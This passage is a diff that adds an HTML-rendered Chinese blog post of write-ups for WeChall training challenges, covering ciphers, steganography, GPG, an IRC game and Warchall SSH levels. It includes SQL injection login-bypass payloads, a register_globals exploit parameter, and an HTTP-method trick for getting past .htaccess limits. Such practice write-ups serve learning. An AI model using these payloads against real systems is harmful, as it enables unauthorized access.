+	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#这里程序先运行一下再天剑这里&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ni&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;y&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ej&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;h&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;io&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;m&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;e&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;f&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ff&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gj&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;!&quot;&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;has_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt;	
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;17training-mysql-i&quot;&gt;17.Training: MySQL I&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin'#&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;18training-mysql-ii&quot;&gt;18.Training: MySQL II&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;' union select md5(1),'admin',md5(1)#&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;19training-www-basics&quot;&gt;19.Training: WWW-Basics&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;这道题需要搭建服务器，如果在本地搭建需要在路由器上进行设置，我这里暂且不行。其次可以用代理的方式，可以设置全局代理，这里这道题目识别的就是你代理服务器的 IP 了，然后在代理服务器上新建相应的文件。(这里要注意要使用 SS 的话，代理服务器不能是国内大陆的)。注意: 用 XFF 欺骗欺骗不了。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;20training-register-globals&quot;&gt;20.Training: Register Globals&lt;/h2&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//注意这道题目: register_globals = on
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;GWF_HTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Register Globals'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$chall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'msg_welcome_back'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))));&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nv&quot;&gt;$chall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onChallengeSolved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GWF_Session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUserID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;所以只要&lt;code class=&quot;highlighter-rouge&quot;&gt;?login[0]=admin&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;21training-math-pyramid&quot;&gt;21.Training: Math Pyramid&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;a^3/18^.5&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;分子有理化，这道题很贱啊&lt;/p&gt;
+
+&lt;h2 id=&quot;22training-baconian&quot;&gt;22.Training: Baconian&lt;/h2&gt;
+
+&lt;p&gt;培根密码 =&amp;gt; 到&lt;a href=&quot;http://rumkin.com/tools/cipher/baconian.php&quot;&gt;这里&lt;/a&gt;解密&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+a = &quot;BaCoN's cIphEr or THE bacOnIAN CiPHer iS a meThOD oF sTEGaNOGrapHY (a METhoD Of HidIng A sECRet MeSsaGe as OpPOsEd TO a TRUe CiPHeR) dEVIseD BY francis bAcoN. a MessAge Is coNCeALED in THe pRESenTatIoN OF TexT, ratHer thaN iTs coNteNt. tO enCODe A MEsSaGe, eaCh lETter Of THe pLAInText Is rePLAcED By A groUp oF fIvE OF thE LEtTers 'a' oR 'B'. this rEPlaCemENt Is done acCOrdiNg To THE alPHAbeT OF tHe BACOnIAN cIpHeR, sHoWn bElOw. NoTe: A SeCoNd vErSiOn oF BaCoN'S CiPhEr uSeS A UnIqUe cOdE FoR EaCh lEtTeR. iN OtHeR WoRdS, i aNd j eAcH HaS ItS OwN PaTtErN. tHe wRiTeR MuSt mAkE UsE Of tWo dIfFeReNt tYpEfAcEs fOr tHiS CiPhEr. AfTeR PrEpArInG A FaLsE MeSsAgE WiTh tHe sAmE NuMbEr oF LeTtErS As aLl oF ThE As aNd bS In tHe rEaL, sEcReT MeSsAgE, tWo tYpEfAcEs aRe cHoSeN, oNe tO RePrEsEnT As aNd tHe oThEr bS. tHeN EaCh lEtTeR Of tHe fAlSe mEsSaGe mUsT Be pReSeNtEd iN ThE ApPrOpRiAtE TyPeFaCe, AcCoRdInG To wHeThEr iT StAnDs fOr aN A Or a b. To dEcOdE ThE MeSsAgE, tHe rEvErSe mEtHoD Is aPpLiEd. EaCh 'TyPeFaCe 1' LeTtEr iN ThE FaLsE MeSsAgE Is rEpLaCeD WiTh aN A AnD EaCh 'TyPeFaCe 2' LeTtEr iS RePlAcEd wItH A B. tHe bAcOnIaN AlPhAbEt iS ThEn uSeD To rEcOvEr tHe oRiGiNaL MeSsAgE. aNy mEtHoD Of wRiTiNg tHe mEsSaGe tHaT AlLoWs tWo dIsTiNcT RePrEsEnTaTiOnS FoR EaCh cHaRaCtEr cAn bE UsEd fOr tHe bAcOn cIpHeR. bAcOn hImSeLf pRePaReD A BiLiTeRaL AlPhAbEt[2] FoR HaNdWrItTeN CaPiTaL AnD SmAlL LeTtErS WiTh eAcH HaViNg tWo aLtErNaTiVe fOrMs, OnE To bE UsEd aS A AnD ThE OtHeR As b. ThIs wAs pUbLiShEd aS An iLlUsTrAtEd pLaTe iN HiS De aUgMeNtIs sCiEnTiArUm (ThE AdVaNcEmEnT Of lEaRnInG). BeCaUsE AnY MeSsAgE Of tHe rIgHt lEnGtH CaN Be uSeD To cArRy tHe eNcOdInG, tHe sEcReT MeSsAgE Is eFfEcTiVeLy hIdDeN In pLaIn sIgHt. ThE FaLsE MeSsAgE CaN Be oN AnY ToPiC AnD ThUs cAn dIsTrAcT A PeRsOn sEeKiNg tO FiNd tHe rEaL MeSsAgE.&quot;
+a = list(a)
+
+
+for i in range(len(a)):
+	if 'A' &amp;lt;= a[i] &amp;lt;= 'Z':
+		a[i] = 'b'
+	elif 'a' &amp;lt;= a[i] &amp;lt;= 'z':
+		a[i] = 'a'
+	else:
+		a[i] = &quot;&quot;
+print &quot;&quot;.join(a)
+
+&quot;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;VERYXWELLXDONEXFELLOWXHACKERXTHEXSECRETXKEYWORDXISXHIGBSNAGFOOOXXKVFKSUJOUWKWWURNWVFNFWJKSVEWVLKXLKJNJVMTMTEVLKUVJFKNKZEUVUVSKKSZKTNKWVKVSUSOEVWVJKKZKVKVJWWVSVUVKVJVJOSVVJUWKSKWVJLFJFJNJFLKVLNFKJUSKKVFJKKVNKWVWWVUWUSVJKZUWWKJKTFKSTMVJKVNKWKWVWVSKKFSSKVFNLFKSWKKWWVWNVWSKXKKTJFV&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;23training-lsb&quot;&gt;23.Training: LSB&lt;/h2&gt;
+
+&lt;p&gt;一道隐写题，使用官方的 Java 小程序 steganabara 来解的。之前都是直接跳过的，这里参考&lt;a href=&quot;https://www.cnblogs.com/Martinium/p/wechall_stegano.html&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;LSB(The least significant bit)&lt;/p&gt;
+
+&lt;h2 id=&quot;24training-gpg&quot;&gt;24.Training: GPG&lt;/h2&gt;
+
+&lt;p&gt;这道题比较琐碎，参考&lt;a href=&quot;http://www.chiange.com/wechall-training-gpg-crypto-training/&quot;&gt;这里&lt;/a&gt;来做的，还有阮一峰老师关于 gpg 的一篇文章&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/07/gpg.html&quot;&gt;GPG入门教程&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;我开始在 kali 下做，按照步骤一步一步来开始是没啥问题，但是收到 wechall 邮件一直解密不了，报错&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gpg: WARNING: no command supplied.  Trying to guess what you mean ...
+gpg: no valid OpenPGP data found.
+gpg: processing message failed: 未知的系统错误
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后我在 Mac 上做还是遇到同样的报错，后来发现是拷贝出来之后加密数据的格式问题，邮件里的密文，凡是空格复制到文件中都要手动转成换行。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;步骤：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gpg2 --gen-key
+
+gpg2 --armor --output public-key.txt --export  &quot;YYXXP &amp;lt;2281XXXX95@qq.com&amp;gt;&quot;
+
+touch secret.txt
+gpg2 secret.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;25limited-access&quot;&gt;25.Limited Access&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AuthUserFile .htpasswd
+AuthGroupFile /dev/null
+AuthName &quot;Authorization Required for the Limited Access Challenge&quot;
+AuthType Basic
+&amp;lt;Limit GET&amp;gt;
+require valid-user
+&amp;lt;/Limit&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;简单看下这里的源码，只对 &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; 做了限制，所以我们使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; 访问即可&lt;/p&gt;
+
+&lt;h2 id=&quot;26limited-access-too&quot;&gt;26.Limited Access Too&lt;/h2&gt;
+
+&lt;p&gt;这道题比上一道题就是多禁了几个 http method，但是并没有禁完&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET
+	GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.
+HEAD
+	HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体.
+POST
+	POST方法用于将实体提交到指定的资源，通常导致状态或服务器上的副作用的更改. 
+PUT
+	PUT方法用请求有效载荷替换目标资源的所有当前表示。
+DELETE
+	DELETE方法删除指定的资源。
+CONNECT
+	CONNECT方法建立一个到由目标资源标识的服务器的隧道。
+OPTIONS
+	OPTIONS方法用于描述目标资源的通信选项。
+TRACE
+	TRACE方法沿着到目标资源的路径执行一个消息环回测试。
+PATCH
+	PATCH方法用于对资源应用部分修改。
+
+//这道题我就使用 PATCH
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;27shadowlamb---chapter-i&quot;&gt;27.Shadowlamb - Chapter I&lt;/h2&gt;
+
+&lt;p&gt;参考&lt;a href=&quot;http://www.chiange.com/wechall-shadowlamb-chapter-i-fun/&quot;&gt;这里&lt;/a&gt;，这里就来到一个游戏了。&lt;/p&gt;
+
+&lt;p&gt;我用的客户端是&lt;a href=&quot;http://xclient.info/s/textual.html?t=f25803378bc6aa0c0495c32f5db65c6edfb2dae5&quot;&gt;Texttual&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Ugah made game. You play game. You #use ScrollOfWisdom.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;连接的地址是: irc.gizmore.org
+频道是: #shadowlamb
+
+#exp 就是不断找小怪打，获取金币
+
+Your attributes: body:1(2), magic:1(5), quickness:3(6), wisdom:0(2), intelligence:2(6), charisma:1(5), luck:0, reputation:0, essence:6.
+#lvlup body  这个是升级的，升级一次会消耗 4 个 karma
+
+#use FirstAid 是涨血量(HP)的
+
+#use XXX
+#eq XXX 后面跟物品代号
+
+#ny 查看当前有多少钱
+#goto Redmond_Alchemist 去这里买 flag
+#use ScrollOfWisdom 就能拿到 flag
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;28training-warchall---the-beginning&quot;&gt;28.Training: Warchall - The Beginning&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;step1: 创建账号&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;step2: &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -p 19198 catcher@warchall.net&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;此时该目录下有两个文件：&lt;code class=&quot;highlighter-rouge&quot;&gt;level  WELCOME.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;先看看 &lt;code class=&quot;highlighter-rouge&quot;&gt;WELCOME.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You will find the solution to each level in 
+/home/level
+or
+/home/user/yournick/level
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这里说有两个路径，我在 level 下确实只看到 4、5、6，那么就去&lt;code class=&quot;highlighter-rouge&quot;&gt;/home/level&lt;/code&gt; 做 1、2、3。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$catcher@warchall /home/level/0 $ cat README.txt 
+bitwarrior
+
+$catcher@warchall /home/level/1 $ grep -rn &quot;solution&quot;*
+LameStartup
+
+$catcher@warchall /home/level/2 $ grep -rn &quot;solution&quot;*
+.porb/.solution:1:The solution is HiddenIsConfig
+grep: .ssh: 权限不够
+.bash_history:8:nano .porb/.solution
+$catcher@warchall /home/level/2/.porb $ ls -a
+HiddenIsConfig
+
+$catcher@warchall /home/level/3 $ grep -rn &quot;solution&quot;*
+RepeatingHistory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;补充:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -rn &quot;hello,world!&quot; *
+
+* : 表示当前目录所有文件，也可以是某个文件名
+-r 是递归查找
+-n 是显示行号
+-R 查找所有文件包含子目录
+-i 忽略大小写
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;下面的 4、5、6 就要换目录了&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$catcher@warchall ~/level/4 $ cat README.txt 
+cat: README.txt: 权限不够
+$catcher@warchall ~/level/4 $ ls -l    &amp;lt;=&amp;gt;  查看权限情况
+总用量 4
+---------- 1 catcher catcher 63 8月  23 15:35 README.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
